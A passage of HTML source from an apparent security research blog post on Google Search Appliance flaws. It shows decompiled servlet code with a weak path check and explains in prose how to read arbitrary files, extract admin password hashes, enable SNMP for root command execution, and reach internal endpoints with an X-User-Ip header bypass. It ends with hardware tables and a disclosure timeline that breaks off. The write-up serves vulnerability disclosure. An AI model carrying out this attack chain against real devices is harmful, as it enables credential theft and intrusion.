        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see here that the only check is whether the string contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt;. 
However, we can directly specify the absolute path and read any local file directly!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The old version of GSA does not have the /font endpoint, 
but /dps/admin/admin has a similar file reading issue. 
You can directly specify the logName for file reading. 
Refer to the diagram below for directly reading the account password from the system management interface:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After successfully cracking the hash, you can log in, enable the SNMP service, 
and combine it with the first vulnerability to execute arbitrary commands with root privileges.&lt;/p&gt;

&lt;h3 id=&quot;other-findings-and-misc&quot;&gt;Other findings and misc&lt;/h3&gt;

&lt;h4 id=&quot;internal-uris-in-web-services&quot;&gt;Internal URIs in web services&lt;/h4&gt;

&lt;p&gt;In GSA, there are multiple sub-services that communicate with each other using the HTTP protocol. 
Many of these services offer URLs such as /varz, /helpz, and /procz. 
We can access them either in the trusted network location defined for the service or using 127.0.0.1:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In vGSA, we observed that there is a service execution parameter called “useripheader=X-User-Ip”, 
this parameter allows direct access to a certain functionality of the externally exposed admin console when 
included in the request header as “X-User-Ip”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/procz&lt;/code&gt; endpoint can even fetch executables and the shared libraries they are using:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;appliances-list&quot;&gt;Appliances list&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Model name&lt;/th&gt;
      &lt;th&gt;Maker&lt;/th&gt;
      &lt;th&gt;Specs&lt;/th&gt;
      &lt;th&gt;version&lt;/th&gt;
      &lt;th&gt;Document amount&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;3.4.14&lt;/td&gt;
      &lt;td&gt;300,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini-002X&lt;/td&gt;
      &lt;td&gt;SuperMicro&lt;/td&gt;
      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
      &lt;td&gt;5.0.0&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1001&lt;/td&gt;
      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;3,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1002&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-7007&lt;/td&gt;
      &lt;td&gt;Dell R710&lt;/td&gt;
      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;10,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-9009&lt;/td&gt;
      &lt;td&gt;Dell unknown&lt;/td&gt;
      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;30,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G100&lt;/td&gt;
      &lt;td&gt;Dell R720XD&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;linux-kernel-version&quot;&gt;Linux Kernel Version&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;GSA version&lt;/th&gt;
      &lt;th&gt;Linux Kernel Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7.6.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.4.0&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.0.14&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;時間&lt;/th&gt;
      &lt;th&gt;事件&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2005/06/10&lt;/td&gt;
      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; reported by H D Moore&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2008&lt;/td&gt;
      &lt;td&gt;GSA 5.0 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008/10/28&lt;/td&gt;
      &lt;td&gt;vgsa_20081028.7z (5.2.0)  released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2013/04/20&lt;/td&gt;
      &lt;td&gt;GSA 6.14.0.G28  released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/03/20&lt;/td&gt;
      &lt;td&gt;Cross-site Scripting &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; reported by Will Dormann&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/01&lt;/td&gt;
      &lt;td&gt;GSA 7.0.14.G238 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/03&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G252 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/12/12&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G264 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/02/07&lt;/td&gt;
      &lt;td&gt;GSA 7.2.0.G270 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/15&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G64 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/22&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G72 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/30&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G74 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/06/04&lt;/td&gt;
      &lt;td&gt;GSA 7.4.0.G82 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2016&lt;/td&gt;
      &lt;td&gt;Google announced that GSA will be sunset from the market.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/01/05&lt;/td&gt;
      &lt;td&gt;XML External Entitiy injection &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; reported by Timo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/05/24&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G36 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/01&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G42 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/31&lt;/td&gt;
      &lt;td&gt;The author of this article obtained this device, with the version being 7.0.14&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/08/25&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G46 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/10/21&lt;/td&gt;
      &lt;td&gt;GSA 7.6.0.G58 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/01/19&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G30 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/04/19&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G36 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/07/28&lt;/td&gt;
      &lt;td&gt;GSA 7.6.50.G64 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/11/09&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G12 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/12/28&lt;/td&gt;
      &lt;td&gt;The final date to order GSA.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/01/17&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G20 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/03/21&lt;/td&gt;
      &lt;td&gt;GSA 7.6.250.G26 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/06/15&lt;/td&gt;
      &lt;td&gt;GSA 7.6.360.G10 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/10/08&lt;/td&gt;
      &lt;td&gt;GSA 7.6.360.G16 released&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2019/04/26&lt;/td&gt;
      &lt;td&gt;GSA 7.6.512.G18 released. It should be the last publicly released version.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;issues reported.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;replied from a bot, and triaged.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
